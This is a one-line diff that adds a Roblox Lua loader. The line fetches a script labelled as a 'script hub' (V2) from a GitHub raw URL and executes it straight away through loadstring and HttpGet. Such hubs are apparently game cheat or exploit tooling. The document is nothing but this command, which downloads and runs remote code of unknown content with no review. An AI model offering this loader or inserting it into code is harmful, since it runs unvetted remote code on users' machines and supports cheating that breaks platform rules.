@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VerbalHubz/Verbal-Hub/main/m0ony%E2%80%99s%20script%20hub%20V2",true))()
